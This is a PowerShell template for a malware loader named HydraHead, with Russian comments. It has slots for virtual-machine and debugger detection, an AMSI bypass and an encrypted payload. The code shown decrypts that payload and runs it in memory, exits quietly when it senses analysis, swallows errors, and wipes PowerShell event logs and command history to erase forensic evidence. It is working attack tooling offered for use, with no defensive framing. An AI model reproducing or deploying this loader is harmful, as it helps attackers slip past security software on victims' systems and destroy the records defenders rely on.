# HydraHead PowerShell Payload Runner
# Полиморфный загрузчик для PowerShell-нагрузок

# Проверки на виртуализацию и отладку
{{ANTI_VM_CHECK}}

{{ANTI_DEBUG_CHECK}}

# Обход AMSI
{{AMSI_BYPASS}}

# Зашифрованная полезная нагрузка
$encryptedPayload = "{{PAYLOAD}}"
$key = "{{KEY}}"
$iv = "{{IV}}"

# Функция расшифровки
{{DECRYPT_FUNC}}

# Функция для случайной задержки
function Get-RandomDelay {
    $delay = Get-Random -Minimum 1 -Maximum 5
    Start-Sleep -Seconds $delay
}

# Функция для проверки интернет-соединения (может использоваться для обнаружения песочницы)
function Test-InternetConnection {
    $domains = @("google.com", "microsoft.com", "amazon.com", "github.com")
    $randomDomain = $domains | Get-Random
    
    try {
        $result = Test-Connection -ComputerName $randomDomain -Count 1 -Quiet
        return $result
    } catch {
        return $false
    }
}

# Функция очистки следов
function Remove-Evidence {
    # Очистка журналов PowerShell
    if (Get-Command wevtutil -ErrorAction SilentlyContinue) {
        try {
            wevtutil cl "Windows PowerShell"
            wevtutil cl "Microsoft-Windows-PowerShell/Operational"
        } catch {}
    }
    
    # Очистка истории команд
    try {
        Clear-History
        Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
    } catch {}
}

# Проверяем среду выполнения
$proceedWithExecution = $true

# Проверка на виртуальные машины
if (Check-VM) {
    $proceedWithExecution = $false
    # Случайно делаем что-то безвредное, чтобы не вызывать подозрений
    Get-Process | Out-Null
    exit
}

# Проверка на отладчики
if (Check-Debugger) {
    $proceedWithExecution = $false
    # Выполняем что-то безвредное
    Get-Service | Out-Null
    exit
}

# Выполнение основной нагрузки, если все проверки пройдены
if ($proceedWithExecution) {
    try {
        # Обходим AMSI перед выполнением
        Bypass-AMSI-1
        
        # Добавляем случайную задержку
        Get-RandomDelay
        
        # Расшифровываем полезную нагрузку
        $encryptedBytes = [System.Convert]::FromBase64String($encryptedPayload)
        $keyBytes = [System.Convert]::FromBase64String($key)
        $ivBytes = [System.Convert]::FromBase64String($iv)
        
        $decryptedData = Decrypt-Payload -EncryptedData $encryptedBytes -Key $keyBytes -IV $ivBytes
        $scriptContent = [System.Text.Encoding]::UTF8.GetString($decryptedData)
        
        # Выполняем расшифрованный скрипт
        $scriptBlock = [ScriptBlock]::Create($scriptContent)
        Invoke-Command -ScriptBlock $scriptBlock
    }
    catch {
        # Ошибки перенаправляем в никуда, чтобы не оставлять следов
        $error.Clear()
    }
    finally {
        # Очищаем следы
        Remove-Evidence
    }
} 